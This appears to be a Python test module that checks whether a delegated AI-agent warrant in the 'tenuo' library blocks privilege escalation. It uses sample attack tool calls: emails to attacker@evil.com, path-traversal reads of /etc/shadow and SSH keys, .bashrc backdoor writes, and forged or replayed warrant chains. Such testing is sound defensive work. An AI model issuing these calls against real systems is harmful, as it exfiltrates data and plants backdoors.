"""
Escalation scenarios for p-agent vs q-agent comparison.

p-agent: Trusted orchestrator with broad authority
q-agent: Task executor with authority DELEGATED from p-agent

The key insight: q-agent's warrant is cryptographically derived from p-agent's.
This is what we're testing - not two independent warrants.
"""

import logging
import time
from dataclasses import dataclass, field

from tenuo import SigningKey, Warrant, Pattern, Range, CEL, Subpath, Wildcard, Authorizer, TenuoError

logger = logging.getLogger(__name__)


# =============================================================================
# Scenarios
# =============================================================================
#
# Strict policies: every parameter is explicitly listed. Unlisted parameters
# are rejected by Tenuo's zero-trust default. Wildcard() marks parameters
# that are allowed but not value-constrained.
#
# Structure:
#   p_constraints: What p-agent can do (broad, all params Wildcard or Range)
#   q_narrowing: How q-agent's authority is attenuated (subset of p's)
#   attacks: Tool calls to test

SCENARIOS = {
    "email_exfil": {
        "description": "Data exfiltration via external email",
        "p_constraints": {
            "send_email": {
                "recipients": Wildcard(),
                "subject": Wildcard(),
                "body": Wildcard(),
            },
            "forward_email": {
                "recipients": Wildcard(),
                "email_id": Wildcard(),
            },
            "delete_file": {"file_id": Wildcard()},
            "read_file": {"file_id": Wildcard()},
        },
        "q_narrowing": {
            "send_email": {
                "recipients": CEL("value.all(r, r.endsWith('@company.com'))"),
                "subject": Wildcard(),
                "body": Wildcard(),
            },
            "forward_email": {
                "recipients": CEL("value.all(r, r.endsWith('@company.com'))"),
                "email_id": Wildcard(),
            },
            "read_file": {"file_id": Wildcard()},
            # delete_file NOT granted
        },
        "attacks": [
            # External recipient exfiltration
            {"tool": "send_email", "args": {"recipients": ["attacker@evil.com"], "subject": "secrets", "body": "data"}},
            {"tool": "send_email", "args": {"recipients": ["leak@gmail.com"], "subject": "dump", "body": "more"}},
            {"tool": "send_email", "args": {"recipients": ["exfil@protonmail.com"], "subject": "stolen", "body": "creds"}},
            {"tool": "send_email", "args": {"recipients": ["drop@tutanota.com"], "subject": "keys", "body": "api_key=sk-123"}},
            # Mixed valid + invalid recipients
            {"tool": "send_email", "args": {"recipients": ["team@company.com", "leak@evil.com"], "subject": "mixed", "body": "data"}},
            # Forward to external
            {"tool": "forward_email", "args": {"recipients": ["attacker@evil.com"], "email_id": "123"}},
            {"tool": "forward_email", "args": {"recipients": ["leak@yahoo.com"], "email_id": "456"}},
            {"tool": "forward_email", "args": {"recipients": ["spy@protonmail.com"], "email_id": "confidential_789"}},
            # Destruction (q-agent has NO delete capability)
            {"tool": "delete_file", "args": {"file_id": "13"}},
            {"tool": "delete_file", "args": {"file_id": "14"}},
            {"tool": "delete_file", "args": {"file_id": "sensitive_doc"}},
            {"tool": "delete_file", "args": {"file_id": "audit_log_2024"}},
            {"tool": "delete_file", "args": {"file_id": "encryption_keys"}},
            # Legitimate
            {"tool": "send_email", "args": {"recipients": ["team@company.com"], "subject": "meeting", "body": "reminder"}},
            {"tool": "send_email", "args": {"recipients": ["hr@company.com"], "subject": "PTO request", "body": "next week"}},
            {"tool": "forward_email", "args": {"recipients": ["manager@company.com"], "email_id": "100"}},
            {"tool": "read_file", "args": {"file_id": "public_doc"}},
        ],
    },

    "financial": {
        "description": "Financial limit escalation",
        "p_constraints": {
            "transfer_money": {
                "amount": Range(0, 100_000),
                "to": Wildcard(),
                "currency": Wildcard(),
            },
            "get_balance": {"account": Wildcard()},
            "view_transactions": {"limit": Wildcard()},
        },
        "q_narrowing": {
            "transfer_money": {
                "amount": Range(0, 50),
                "to": Wildcard(),
                "currency": Wildcard(),
            },
            "get_balance": {"account": Wildcard()},
            "view_transactions": {"limit": Wildcard()},
        },
        "attacks": [
            # Over-limit escalation
            {"tool": "transfer_money", "args": {"amount": 500, "to": "attacker", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 5000, "to": "offshore", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 50000, "to": "theft", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 99999, "to": "max_steal", "currency": "USD"}},
            # Boundary probing
            {"tool": "transfer_money", "args": {"amount": 51, "to": "just_over", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 50.01, "to": "float_over", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 100, "to": "double_limit", "currency": "EUR"}},
            # Within q-agent's limit
            {"tool": "transfer_money", "args": {"amount": 25, "to": "vendor", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 50, "to": "petty_cash", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 1, "to": "test_account", "currency": "USD"}},
            {"tool": "transfer_money", "args": {"amount": 49.99, "to": "just_under", "currency": "GBP"}},
            # Read operations
            {"tool": "get_balance", "args": {"account": "main"}},
            {"tool": "view_transactions", "args": {"limit": 10}},
        ],
    },

    "file_access": {
        "description": "Sensitive file access escalation",
        "p_constraints": {
            "read_file": {"path": Wildcard()},
            "write_file": {"path": Wildcard(), "content": Wildcard()},
            "delete_file": {"path": Wildcard()},
        },
        "q_narrowing": {
            "read_file": {"path": Subpath("/public")},
            "write_file": {"path": Subpath("/drafts"), "content": Wildcard()},
            # delete_file NOT granted
        },
        "attacks": [
            # Direct out-of-scope reads
            {"tool": "read_file", "args": {"path": "/secrets/api_keys.json"}},
            {"tool": "read_file", "args": {"path": "/admin/passwords.txt"}},
            {"tool": "read_file", "args": {"path": "/private/financials.xlsx"}},
            {"tool": "read_file", "args": {"path": "/etc/shadow"}},
            {"tool": "read_file", "args": {"path": "/home/deploy/.ssh/id_rsa"}},
            # Path traversal
            {"tool": "read_file", "args": {"path": "/public/../secrets/api_keys.json"}},
            {"tool": "read_file", "args": {"path": "/public/../../etc/passwd"}},
            {"tool": "read_file", "args": {"path": "/public/./../../private/data"}},
            {"tool": "write_file", "args": {"path": "/drafts/../../etc/passwd", "content": "malicious"}},
            {"tool": "write_file", "args": {"path": "/drafts/../../../root/.bashrc", "content": "backdoor"}},
            # Out-of-scope writes
            {"tool": "write_file", "args": {"path": "/config/settings.json", "content": "malicious"}},
            {"tool": "write_file", "args": {"path": "/bin/backdoor.sh", "content": "#!/bin/bash"}},
            {"tool": "write_file", "args": {"path": "/var/log/audit.log", "content": ""}},
            # Capability not granted (delete)
            {"tool": "delete_file", "args": {"path": "/important/data.db"}},
            {"tool": "delete_file", "args": {"path": "/backups/latest.tar"}},
            {"tool": "delete_file", "args": {"path": "/public/readme.txt"}},
            # Legitimate
            {"tool": "read_file", "args": {"path": "/public/readme.txt"}},
            {"tool": "read_file", "args": {"path": "/public/docs/api.md"}},
            {"tool": "write_file", "args": {"path": "/drafts/notes.md", "content": "legitimate"}},
            {"tool": "write_file", "args": {"path": "/drafts/report.txt", "content": "quarterly update"}},
        ],
    },
}


# =============================================================================
# Data Classes
# =============================================================================

@dataclass
class AttackResult:
    tool: str
    args: dict
    p_allowed: bool  # Would p-agent allow this?
    q_allowed: bool  # Would q-agent (delegated) allow this?
    label: str = ""  # Optional annotation for display

    @property
    def escalation_prevented(self) -> bool:
        """True if call violated q-agent's policy (p allowed, q blocked)."""
        return self.p_allowed and not self.q_allowed


@dataclass
class ScenarioResult:
    name: str
    description: str
    attacks: list[AttackResult] = field(default_factory=list)

    @property
    def p_allowed(self) -> int:
        return sum(1 for a in self.attacks if a.p_allowed)

    @property
    def p_blocked(self) -> int:
        return sum(1 for a in self.attacks if not a.p_allowed)

    @property
    def q_allowed(self) -> int:
        return sum(1 for a in self.attacks if a.q_allowed)

    @property
    def q_blocked(self) -> int:
        return sum(1 for a in self.attacks if not a.q_allowed)

    @property
    def escalation_prevented(self) -> int:
        return sum(1 for a in self.attacks if a.escalation_prevented)

    @property
    def both_allowed(self) -> int:
        """Legitimate calls: both p-agent and q-agent allow."""
        return sum(1 for a in self.attacks if a.p_allowed and a.q_allowed)

    @property
    def expected_violations(self) -> int:
        """Calls that should be blocked: p allows but q's policy forbids."""
        return self.p_allowed - self.both_allowed

    @property
    def enforcement_rate(self) -> float:
        """Of calls that should be blocked, how many were? (target: 100%)"""
        if self.expected_violations == 0:
            return 1.0
        return self.escalation_prevented / self.expected_violations

    @property
    def damage_reduction(self) -> float:
        """What fraction of p-agent's surface area did delegation cut?"""
        if self.p_allowed == 0:
            return 0.0
        return self.escalation_prevented / self.p_allowed

    @property
    def escalation_prevention_rate(self) -> float:
        """Alias for enforcement_rate (backward compat)."""
        return self.enforcement_rate


# =============================================================================
# Execution
# =============================================================================

def create_p_warrant(
    constraints: dict,
    issuer_key: SigningKey,
    holder_key: SigningKey,
    ttl: int = 3600,
) -> Warrant:
    """Create p-agent's warrant with broad constraints."""
    builder = Warrant.mint_builder()
    for tool_name, tool_constraints in constraints.items():
        builder.capability(tool_name, tool_constraints)
    builder.holder(holder_key.public_key)
    builder.ttl(ttl)
    return builder.mint(issuer_key)


def create_q_warrant(
    p_warrant: Warrant,
    p_key: SigningKey,
    q_key: SigningKey,
    q_narrowing: dict,
    ttl: int = 300,
) -> Warrant:
    """
    Create q-agent's warrant by DELEGATING from p-agent.
    
    This is the key: q's authority is cryptographically derived from p's.
    q cannot have capabilities that p doesn't have.
    """
    builder = p_warrant.grant_builder()
    
    # Only grant tools specified in q_narrowing
    for tool_name, tool_constraints in q_narrowing.items():
        builder.capability(tool_name, tool_constraints)
    
    builder.holder(q_key.public_key)
    builder.ttl(ttl)
    
    return builder.grant(p_key)


def check_authorization(
    chain: list[Warrant],
    holder_key: SigningKey,
    root_key: SigningKey,
    tool: str,
    args: dict,
) -> bool:
    """
    Check if a tool call is authorized using full chain verification.

    The Authorizer trusts root_key and verifies the entire delegation
    chain (root -> ... -> leaf). The leaf warrant's holder signs the PoP.

    Returns True if authorized, False if denied by TenuoError.
    Internal errors (bugs, type errors, etc.) are logged and also return
    False — callers should treat unexpected False as a red flag, not a
    normal denial.
    """
    leaf = chain[-1]
    try:
        signature = leaf.sign(holder_key, tool, args, int(time.time()))

        authorizer = Authorizer(trusted_roots=[root_key.public_key])
        authorizer.check_chain(chain, tool, args, signature=bytes(signature))
        return True
    except TenuoError:
        return False
    except Exception as e:
        logger.error("Internal error (not a policy denial): %s: %s", type(e).__name__, e)
        return False


def run_scenario(scenario_name: str) -> ScenarioResult:
    """Run a single escalation scenario with proper delegation."""
    scenario = SCENARIOS[scenario_name]

    # Generate keys
    org_key = SigningKey.generate()  # Organization root
    p_key = SigningKey.generate()    # p-agent (orchestrator)
    q_key = SigningKey.generate()    # q-agent (executor)

    # p-agent: broad warrant from org
    p_warrant = create_p_warrant(
        scenario["p_constraints"],
        org_key,
        p_key,
    )

    # q-agent: DELEGATED from p-agent (this is the key!)
    q_warrant = create_q_warrant(
        p_warrant,
        p_key,
        q_key,
        scenario["q_narrowing"],
    )

    result = ScenarioResult(
        name=scenario_name,
        description=scenario["description"],
    )

    for attack in scenario["attacks"]:
        tool = attack["tool"]
        args = attack["args"]

        # Full chain verification: Authorizer trusts org_key as root.
        # p_warrant: chain = [p_warrant], root = org_key
        # q_warrant: chain = [p_warrant, q_warrant], root = org_key
        p_allowed = check_authorization([p_warrant], p_key, org_key, tool, args)
        q_allowed = check_authorization([p_warrant, q_warrant], q_key, org_key, tool, args)

        result.attacks.append(AttackResult(
            tool=tool,
            args=args,
            p_allowed=p_allowed,
            q_allowed=q_allowed,
        ))

    return result


def run_holder_binding_scenario() -> ScenarioResult:
    """
    Test that q-agent's warrant is bound to q-agent's key.

    If an attacker has p-agent's key but only q-agent's warrant,
    the PoP check fails because the warrant is holder-bound.
    This maps to slide card 4 (impersonation / holder binding).
    """
    org_key = SigningKey.generate()
    p_key = SigningKey.generate()
    q_key = SigningKey.generate()

    p_warrant = create_p_warrant(
        {"send_email": {
            "recipients": Wildcard(),
            "subject": Wildcard(),
            "body": Wildcard(),
        }},
        org_key,
        p_key,
    )

    q_warrant = create_q_warrant(
        p_warrant, p_key, q_key,
        {"send_email": {
            "recipients": CEL("value.all(r, r.endsWith('@company.com'))"),
            "subject": Wildcard(),
            "body": Wildcard(),
        }},
    )

    result = ScenarioResult(
        name="holder_binding",
        description="PoP mismatch: wrong key cannot use someone else's warrant",
    )

    tool = "send_email"
    args = {"recipients": ["team@company.com"], "subject": "test", "body": "hello"}

    # q-agent with own key + own warrant → allowed
    q_allowed = check_authorization([p_warrant, q_warrant], q_key, org_key, tool, args)

    # p-agent tries to use q-agent's warrant (wrong holder key) → denied
    p_impersonating = check_authorization([p_warrant, q_warrant], p_key, org_key, tool, args)

    # Random attacker key with q's warrant → denied
    attacker_key = SigningKey.generate()
    attacker_impersonating = check_authorization([p_warrant, q_warrant], attacker_key, org_key, tool, args)

    result.attacks.append(AttackResult(
        tool=tool, args=args,
        p_allowed=True,
        q_allowed=q_allowed,
        label="q-key signs q-warrant (legitimate)",
    ))
    result.attacks.append(AttackResult(
        tool=tool, args=args,
        p_allowed=True,
        q_allowed=p_impersonating,
        label="p-key signs q-warrant (wrong holder)",
    ))
    result.attacks.append(AttackResult(
        tool=tool, args=args,
        p_allowed=True,
        q_allowed=attacker_impersonating,
        label="attacker-key signs q-warrant (unknown key)",
    ))

    return result


def run_crypto_integrity_scenario() -> ScenarioResult:
    """
    Test cryptographic integrity properties that aren't covered by
    constraint-level scenarios.

    Each attack targets a different property:
    - Tampered warrant (bit-flip → deserialization failure)
    - Expired TTL
    - Wrong root of trust
    - Self-minted warrant (untrusted issuer)
    - Reversed chain ordering
    - Terminal warrant re-delegation
    - Stale PoP timestamp (replay)
    - PoP tool mismatch
    - PoP args mismatch

    p_allowed=True for all: these are attacks the adversary would attempt.
    q_allowed: actual result from the crypto layer (should be False for attacks).
    """
    import base64

    org_key = SigningKey.generate()
    p_key = SigningKey.generate()
    q_key = SigningKey.generate()
    attacker_key = SigningKey.generate()

    tool = "read_file"
    args = {"path": "/public/readme.txt"}
    cap = {"read_file": {"path": Wildcard()}}

    p_warrant = create_p_warrant(cap, org_key, p_key)
    q_warrant = create_q_warrant(p_warrant, p_key, q_key, cap, ttl=300)

    result = ScenarioResult(
        name="crypto_integrity",
        description="Cryptographic integrity: forgery, expiry, trust, replay, terminal",
    )

    # --- Baseline: legitimate use ---
    legit = check_authorization([p_warrant, q_warrant], q_key, org_key, tool, args)
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=legit,
        label="Baseline: valid chain + valid PoP (legitimate)",
    ))

    # --- 1. Tampered warrant (bit-flip) ---
    try:
        b64 = q_warrant.to_base64()
        raw = bytearray(base64.urlsafe_b64decode(b64 + "=="))
        raw[len(raw) // 2] ^= 0xFF
        tampered_b64 = base64.urlsafe_b64encode(bytes(raw)).decode()
        _ = Warrant(tampered_b64)  # expected to raise on deserialization
        tampered_accepted = True
    except Exception:
        # Deserialization failure is the expected outcome — any exception counts
        tampered_accepted = False
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=tampered_accepted,
        label="Tampered warrant: bit-flip in serialized bytes",
    ))

    # --- 2. Expired TTL ---
    short_p = create_p_warrant(cap, org_key, p_key, ttl=1)
    short_q = create_q_warrant(short_p, p_key, q_key, cap, ttl=1)
    time.sleep(2)
    expired = check_authorization([short_p, short_q], q_key, org_key, tool, args)
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=expired,
        label="Expired warrant: TTL=1s, checked after 2s",
    ))

    # --- 3. Wrong root of trust ---
    wrong_root = SigningKey.generate()
    wrong_trust = check_authorization(
        [p_warrant, q_warrant], q_key, wrong_root, tool, args,
    )
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=wrong_trust,
        label="Wrong root of trust: unrelated org key",
    ))

    # --- 4. Self-minted warrant (q bypasses delegation) ---
    self_mint = (Warrant.mint_builder()
        .capability("read_file", {"path": Wildcard()})
        .holder(q_key.public_key)
        .ttl(300)
        .mint(q_key))
    self_mint_ok = check_authorization([self_mint], q_key, org_key, tool, args)
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=self_mint_ok,
        label="Self-minted warrant: q signs own root (untrusted issuer)",
    ))

    # --- 5. Reversed chain ---
    reversed_ok = check_authorization(
        [q_warrant, p_warrant], q_key, org_key, tool, args,
    )
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=reversed_ok,
        label="Reversed chain: [q, p] instead of [p, q]",
    ))

    # --- 6. Terminal warrant re-delegation ---
    terminal_builder = p_warrant.grant_builder()
    terminal_builder.capability("read_file", {"path": Wildcard()})
    terminal_builder.holder(q_key.public_key)
    terminal_builder.ttl(120)
    terminal_builder.terminal()
    terminal_w = terminal_builder.grant(p_key)

    try:
        # Attempt 1: build the re-delegated warrant (should raise at creation)
        re_del_builder = terminal_w.grant_builder()
        re_del_builder.capability("read_file", {"path": Wildcard()})
        re_del_builder.holder(attacker_key.public_key)
        re_del_builder.ttl(60)
        re_del_w = re_del_builder.grant(q_key)
        # Attempt 2: even if creation didn't raise, authorization must fail
        terminal_redel = check_authorization(
            [p_warrant, terminal_w, re_del_w], attacker_key, org_key, tool, args
        )
    except TenuoError:
        terminal_redel = False
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=terminal_redel,
        label="Terminal re-delegation: delegate from non-delegatable warrant",
    ))

    # --- 7. Stale PoP (replay with old timestamp) ---
    try:
        old_sig = q_warrant.sign(q_key, tool, args, int(time.time()) - 300)
        auth = Authorizer(trusted_roots=[org_key.public_key])
        auth.check_chain(
            [p_warrant, q_warrant], tool, args, signature=bytes(old_sig),
        )
        stale_ok = True
    except TenuoError:
        stale_ok = False
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=stale_ok,
        label="Stale PoP: timestamp 300s in the past (replay)",
    ))

    # --- 8. PoP tool mismatch ---
    try:
        wrong_tool_sig = q_warrant.sign(q_key, "write_file", args, int(time.time()))
        auth = Authorizer(trusted_roots=[org_key.public_key])
        auth.check_chain(
            [p_warrant, q_warrant], tool, args, signature=bytes(wrong_tool_sig),
        )
        tool_mismatch_ok = True
    except TenuoError:
        tool_mismatch_ok = False
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=tool_mismatch_ok,
        label="PoP tool mismatch: signed for write_file, authorized for read_file",
    ))

    # --- 9. PoP args mismatch ---
    try:
        wrong_args_sig = q_warrant.sign(
            q_key, tool, {"path": "/secrets/keys.json"}, int(time.time()),
        )
        auth = Authorizer(trusted_roots=[org_key.public_key])
        auth.check_chain(
            [p_warrant, q_warrant], tool, args, signature=bytes(wrong_args_sig),
        )
        args_mismatch_ok = True
    except TenuoError:
        args_mismatch_ok = False
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=args_mismatch_ok,
        label="PoP args mismatch: signed for /secrets/keys.json, authorized for /public/readme.txt",
    ))

    return result


def run_chain_manipulation_scenario() -> ScenarioResult:
    """
    Test that chain verification rejects structurally invalid chains.

    Each attack presents a malformed delegation chain to the Authorizer:
    - Constraint escalation (child wider than parent)
    - Cross-chain splicing (warrants from unrelated chains)
    - Duplicate warrants in chain
    - Three-level chain with middle warrant removed (gap)
    - Orphan child (parent not in trusted roots, not in chain)
    """
    org_key = SigningKey.generate()
    p_key = SigningKey.generate()
    q_key = SigningKey.generate()

    tool = "transfer"
    args = {"amount": 25, "to": "vendor", "currency": "USD"}

    p_warrant = create_p_warrant(
        {"transfer": {"amount": Range(0, 50), "to": Wildcard(), "currency": Wildcard()}},
        org_key, p_key,
    )
    # q constraints intentionally identical to p — this scenario tests chain
    # structural attacks (splice, gap, duplicate), not constraint narrowing.
    q_warrant = create_q_warrant(
        p_warrant, p_key, q_key,
        {"transfer": {"amount": Range(0, 50), "to": Wildcard(), "currency": Wildcard()}},
    )

    result = ScenarioResult(
        name="chain_manipulation",
        description="Chain verification: structural attacks on delegation chains",
    )

    # --- Baseline: valid chain ---
    legit = check_authorization([p_warrant, q_warrant], q_key, org_key, tool, args)
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=legit,
        label="Baseline: valid [p, q] chain (legitimate)",
    ))

    # --- 1. Constraint escalation via delegation ---
    try:
        b = p_warrant.grant_builder()
        b.capability("transfer", {"amount": Range(0, 100_000), "to": Wildcard(), "currency": Wildcard()})
        b.holder(q_key.public_key)
        b.ttl(120)
        escalated = b.grant(p_key)
        escalation_ok = check_authorization(
            [p_warrant, escalated], q_key, org_key, tool,
            {"amount": 500, "to": "attacker", "currency": "USD"},
        )
    except TenuoError:
        escalation_ok = False
    result.attacks.append(AttackResult(
        tool=tool, args={"amount": 500, "to": "attacker", "currency": "USD"},
        p_allowed=True, q_allowed=escalation_ok,
        label="Constraint escalation: child Range(0,100000) from parent Range(0,50)",
    ))

    # --- 2. Cross-chain splicing ---
    org2 = SigningKey.generate()
    p2_key = SigningKey.generate()
    q2_key = SigningKey.generate()
    p2_warrant = create_p_warrant(
        {"transfer": {"amount": Range(0, 100_000), "to": Wildcard(), "currency": Wildcard()}},
        org2, p2_key,
    )
    q2_warrant = create_q_warrant(
        p2_warrant, p2_key, q2_key,
        {"transfer": {"amount": Range(0, 100_000), "to": Wildcard(), "currency": Wildcard()}},
    )
    splice_ok = check_authorization(
        [p_warrant, q2_warrant], q2_key, org_key, tool,
        {"amount": 500, "to": "attacker", "currency": "USD"},
    )
    result.attacks.append(AttackResult(
        tool=tool, args={"amount": 500, "to": "attacker", "currency": "USD"},
        p_allowed=True, q_allowed=splice_ok,
        label="Cross-chain splice: q from chain2 presented under chain1's root",
    ))

    # --- 3. Duplicate warrants [p, q, q] ---
    dup_ok = check_authorization(
        [p_warrant, q_warrant, q_warrant], q_key, org_key, tool, args,
    )
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=dup_ok,
        label="Duplicate warrant: [p, q, q] chain",
    ))

    # --- 4. Duplicate parent [p, p, q] ---
    dup_parent_ok = check_authorization(
        [p_warrant, p_warrant, q_warrant], q_key, org_key, tool, args,
    )
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=dup_parent_ok,
        label="Duplicate parent: [p, p, q] chain",
    ))

    # --- 5. Chain gap: three levels, middle removed ---
    mid_key = SigningKey.generate()
    mid_warrant = create_q_warrant(
        p_warrant, p_key, mid_key,
        {"transfer": {"amount": Range(0, 50), "to": Wildcard(), "currency": Wildcard()}},
    )
    b3 = mid_warrant.grant_builder()
    b3.capability("transfer", {"amount": Range(0, 50), "to": Wildcard(), "currency": Wildcard()})
    b3.holder(q_key.public_key)
    b3.ttl(60)
    leaf = b3.grant(mid_key)

    gap_ok = check_authorization(
        [p_warrant, leaf], q_key, org_key, tool, args,
    )
    result.attacks.append(AttackResult(
        tool=tool, args=args, p_allowed=True, q_allowed=gap_ok,
        label="Chain gap: [p, leaf] with middle warrant removed",
    ))

    # --- 6. Orphan chain: child with no matching parent ---
    orphan_org = SigningKey.generate()
    orphan_p = SigningKey.generate()
    orphan_q = SigningKey.generate()
    orphan_p_w = create_p_warrant(
        {"transfer": {"amount": Range(0, 100_000), "to": Wildcard(), "currency": Wildcard()}},
        orphan_org, orphan_p,
    )
    orphan_q_w = create_q_warrant(
        orphan_p_w, orphan_p, orphan_q,
        {"transfer": {"amount": Range(0, 100_000), "to": Wildcard(), "currency": Wildcard()}},
    )
    orphan_ok = check_authorization(
        [orphan_q_w], orphan_q, org_key, tool,
        {"amount": 500, "to": "attacker", "currency": "USD"},
    )
    result.attacks.append(AttackResult(
        tool=tool, args={"amount": 500, "to": "attacker", "currency": "USD"},
        p_allowed=True, q_allowed=orphan_ok,
        label="Orphan chain: child presented alone, parent not in trusted roots",
    ))

    return result


def run_policy_scenarios() -> list[ScenarioResult]:
    """Layer 1: Policy enforcement scenarios (constraint engine correctness)."""
    return [run_scenario(name) for name in SCENARIOS]


def run_crypto_scenarios() -> list[ScenarioResult]:
    """Layer 2: Cryptographic integrity scenarios (forgery, tampering, chain attacks)."""
    return [
        run_holder_binding_scenario(),
        run_crypto_integrity_scenario(),
        run_chain_manipulation_scenario(),
    ]


def run_all_scenarios() -> list[ScenarioResult]:
    """Run all scenarios (backward compat)."""
    return run_policy_scenarios() + run_crypto_scenarios()
